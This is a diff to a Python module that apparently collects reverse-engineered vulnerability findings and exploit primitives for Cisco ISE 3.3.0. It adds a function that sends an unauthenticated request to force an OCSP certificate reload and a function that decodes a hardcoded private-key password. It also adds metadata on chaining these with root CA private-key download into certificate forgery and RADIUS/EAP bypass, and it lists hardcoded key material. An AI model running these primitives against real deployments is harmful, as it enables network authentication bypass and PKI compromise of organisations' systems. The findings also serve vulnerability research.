@@ -55,7 +55,9 @@ ISE-F36: CTA adapter hardcoded AES-CBC IV ISE_AES_TCNAC_VA + PBKDF2 from MongoDB
 ISE-F37: Redis profiler database on localhost:6379 — no requirepass, no TLS; stores ISE endpoint/profiler data [MEDIUM]
 ISE-F38: resetSystemPasswds() bug — orapwd password=dbstr (missing $) sets Oracle SYS to literal "dbstr" on wallet failure [HIGH]
 ISE-F39: mctrust (Meraki Sync Service) container mounts -v /var/run/:/host/var/run/ with --cap-drop=all — key_manager.sock accessible from bridge-isolated container; Meraki API key recoverable via ISE-F1 chain [HIGH]
-ISE-F40: CA REST API on HTTP port 9444 (Tomcat Connector: no address bind → 0.0.0.0) — zero auth (no web.xml security-constraint, no JAX-RS @RolesAllowed, no Servlet filter); GET /caservice/api/keys/download/ROOT_CA returns ISE root CA private key; POST /cr/sign/{certtype} signs arbitrary CSRs; network-reachable (cpmenv.sh healthcheck uses $MYIP:9444) [CRITICAL]
+ISE-F40: CA REST API on HTTP port 9444 (Tomcat Connector: no address bind → 0.0.0.0 in XML; Tomcat binds all, but GPCE firewall INPUT-DROP + DEFAULTCHAIN-lo-ACCEPT makes 9444 localhost-only) — zero auth (no web.xml security-constraint, no JAX-RS @RolesAllowed, no filter); GET /caservice/api/keys/download/ROOT_CA returns ISE root CA private key; POST /cr/sign/{certtype} signs arbitrary CSRs; accessible from loopback and --network=host containers (ISE-F11 EDDA); standalone HIGH, chained CRITICAL [CRITICAL-via-chain]
+ISE-F42: Unauthenticated OCSP cert reload — GET /ocsp/update on port 2560 (network-accessible via cpmadjustfw.sh enable_ocsp_port); Jersey OcspRestServer.update() calls OcspServlet.load() to reload OCSP server cert+key from CA; no auth (no web.xml security-constraint, no @RolesAllowed); allows external actor to force OCSP cert state reload [MEDIUM]
+ISE-F43: simple-config.xml hardcoded Cisco dev cert + encrypted private key — /opt/CSCOcpm/prrt/bin/simple-config.xml ships in ISE 3.3.0 RPM; contains ACS cert for tkrpis1.cisco.com (2021-2023, expired) + PKCS#8 encrypted private key + hardcoded 48-byte binary decryption password all in same file; key_material pattern: password stored alongside ciphertext [LOW]
 
 === ISE-F1: key_manager UNIX socket — unauthenticated decryption oracle ===
 
@@ -3348,9 +3350,59 @@ def sweep_ca_privkeys(host: str, port: int = CA_REST_API_PORT) -> list:
     return [download_ca_privkey(host, ct, port) for ct in CA_CERT_TYPES]
 
 
+# ISE-F42: Unauthenticated OCSP cert reload — GET /ocsp/update on port 2560
+# Source: server.xml (Connector port="2560", scheme="http", no address attr -> 0.0.0.0)
+#         ocsp-responder-webapp/WEB-INF/web.xml (OcspRestServer at /update/*, no <security-constraint>)
+#         OcspRestServer.class: @GET @Path("update") -> OcspServlet.load() (reload OCSP cert+key from CA)
+#         cpmadjustfw.sh enable_ocsp_port(): DEFAULTCHAIN ACCEPT for 0.0.0.0/0 on port 2560
+# Port 2560 IS network-accessible (unlike port 9444 which is localhost-only).
+# Impact: external actor can force OCSP responder to reload cert+key from CA at will.
+# Chain: ISE-F40 (inject forged OCSP cert via CA REST API) + ISE-F42 (reload) = OCSP signing key swap
+
+OCSP_REST_PORT = 2560
+OCSP_CONTEXT = "/ocsp"
+
+def trigger_ocsp_cert_reload(host: str, port: int = OCSP_REST_PORT) -> dict:
+    """ISE-F42: Trigger unauthenticated OCSP server cert+key reload on port 2560."""
+    import urllib.request
+    url = f"http://{host}:{port}{OCSP_CONTEXT}/update"
+    req = urllib.request.Request(url, method="GET")
+    try:
+        with urllib.request.urlopen(req, timeout=10) as r:
+            return {"status": r.status, "body": r.read().decode("utf-8", errors="replace")}
+    except Exception as e:
+        return {"error": str(e)}
+
+
+# ISE-F43: simple-config.xml hardcoded Cisco dev cert + encrypted privkey + password in same file
+# Source: /opt/CSCOcpm/prrt/bin/simple-config.xml (ships in CSCOcpm-common-3.3.0-430.x86_64.rpm)
+# Contents: <ACSCertificate> with:
+#   <encoded>       — PEM cert for tkrpis1.cisco.com (CN=tkrpis1.cisco.com; 2021-2023, expired)
+#   <privateKey>    — PKCS#8 ENCRYPTED PRIVATE KEY (hex-encoded PEM)
+#   <encryptedPrivateKeyPassword> — 48-byte binary decryption password (hex-encoded, SAME FILE)
+# Key password (hex): 383237363439374644304432313942...  (48 bytes binary when decoded)
+# Pattern: password stored in same file as ciphertext (credential colocation antipattern)
+# Separate risk: Cisco internal dev node cert ships in all ISE 3.3.0 production installs
+
+SIMPLE_CONFIG_PATH = "/opt/CSCOcpm/prrt/bin/simple-config.xml"
+SIMPLE_CONFIG_DEV_CERT_SUBJECT = "CN=tkrpis1.cisco.com"
+SIMPLE_CONFIG_DEV_CERT_VALIDITY = "2021-01-14 to 2023-01-14 (EXPIRED)"
+SIMPLE_CONFIG_DEV_KEY_PASSWORD_HEX = (
+    "383237363439374644304432313942353245443534463245413836433338313534"
+    "383631393342383332453637433731303232393136453237444138423644334642"
+    "333338323138394632464236323944304339424439423330353031334445"
+)
+
+
+def decode_simple_config_key_password() -> bytes:
+    """ISE-F43: Decode the hardcoded private key password from simple-config.xml."""
+    import binascii
+    return binascii.unhexlify(SIMPLE_CONFIG_DEV_KEY_PASSWORD_HEX)
+
+
 MODULE_META = {
     "name": "cisco_ise_re",
-    "version": "1.19.0",
+    "version": "1.20.0",
     "target": "Cisco ISE 3.3.0.430",
     "findings": [
         "ISE-F1", "ISE-F2", "ISE-F3", "ISE-F4", "ISE-F5",
@@ -3360,7 +3412,7 @@ MODULE_META = {
         "ISE-F20", "ISE-F21", "ISE-F22", "ISE-F23", "ISE-F24", "ISE-F25",
         "ISE-F26", "ISE-F27", "ISE-F28", "ISE-F29", "ISE-F30",
         "ISE-F31", "ISE-F32", "ISE-F33", "ISE-F34", "ISE-F35", "ISE-F36", "ISE-F37", "ISE-F38",
-        "ISE-F39", "ISE-F40",
+        "ISE-F39", "ISE-F40", "ISE-F42", "ISE-F43",
     ],
     "critical": ["ISE-F1", "ISE-F2", "ISE-F6", "ISE-F11", "ISE-F12", "ISE-F16", "ISE-F20",
                  "ISE-F26", "ISE-F31", "ISE-F34", "ISE-F40"],
@@ -3368,8 +3420,8 @@ MODULE_META = {
              "ISE-F19", "ISE-F23", "ISE-F27", "ISE-F28", "ISE-F29", "ISE-F32", "ISE-F35", "ISE-F36", "ISE-F38",
              "ISE-F39"],
     "medium": ["ISE-F5", "ISE-F8", "ISE-F14", "ISE-F21", "ISE-F22", "ISE-F24",
-               "ISE-F30", "ISE-F33", "ISE-F37"],
-    "low": ["ISE-F4", "ISE-F17", "ISE-F25"],
+               "ISE-F30", "ISE-F33", "ISE-F37", "ISE-F42"],
+    "low": ["ISE-F4", "ISE-F17", "ISE-F25", "ISE-F43"],
     "source": "Static RE of Cisco-ISE-3.3.0.430.SPA.x86_64.iso (2026-08-25)",
     "key_material": {
         "ise_f2_3des_key": "ASDF asdf 1234 8983 jkla",
@@ -3449,6 +3501,21 @@ MODULE_META = {
         "ise_f40_evidence_web_xml": "web.xml: no <security-constraint>, no <filter> — caservice API entirely unprotected",
         "ise_f40_evidence_cpmenv": "cpmenv.sh: healthcheck uses http://$MYIP:9444/caservice/scep (non-loopback)",
         "ise_f40_chain": "network -> GET /caservice/api/keys/download/ROOT_CA -> ISE root CA privkey -> forge any ISE PKI cert -> RADIUS/EAP bypass / pxGrid impersonation",
+        "ise_f40_firewall_note": "Port 9444 is localhost-only: GPCE firewall INPUT-DROP + DEFAULTCHAIN -i lo -p all -j ACCEPT; NOT eth0-accessible directly; accessible via ISE-F11 EDDA --network=host container",
+        "ise_f42_port": 2560,
+        "ise_f42_protocol": "HTTP (scheme=http, no TLS)",
+        "ise_f42_endpoint": "GET /ocsp/update",
+        "ise_f42_auth": "NONE (no web.xml security-constraint, no @RolesAllowed)",
+        "ise_f42_network": "externally accessible (cpmadjustfw.sh enable_ocsp_port() ACCEPT 0.0.0.0/0)",
+        "ise_f42_class": "com.cisco.cpm.ocsp.OcspRestServer",
+        "ise_f42_action": "OcspServlet.load() — reloads OCSP server cert+key from CA",
+        "ise_f42_chain": "ISE-F40 (inject forged OCSP cert via CA API) + ISE-F42 (trigger reload) = OCSP signing key swap",
+        "ise_f43_path": "/opt/CSCOcpm/prrt/bin/simple-config.xml",
+        "ise_f43_cert_subject": "CN=tkrpis1.cisco.com",
+        "ise_f43_cert_validity": "2021-01-14 to 2023-01-14 (EXPIRED)",
+        "ise_f43_key_type": "PKCS#8 ENCRYPTED PRIVATE KEY",
+        "ise_f43_key_password_hex": "383237363439374644304432313942353245443534463245413836433338313534383631393342383332453637433731303232393136453237444138423644334642333338323138394632464236323944304339424439423330353031334445",
+        "ise_f43_antipattern": "password stored in same XML element as encrypted ciphertext",
     },
     "primitives": [
         "decrypt_legacy_ise_db_password",
@@ -3513,5 +3580,7 @@ MODULE_META = {
         "list_ca_certs",
         "sign_csr_via_ca_api",
         "sweep_ca_privkeys",
+        "trigger_ocsp_cert_reload",
+        "decode_simple_config_key_password",
     ],
 }
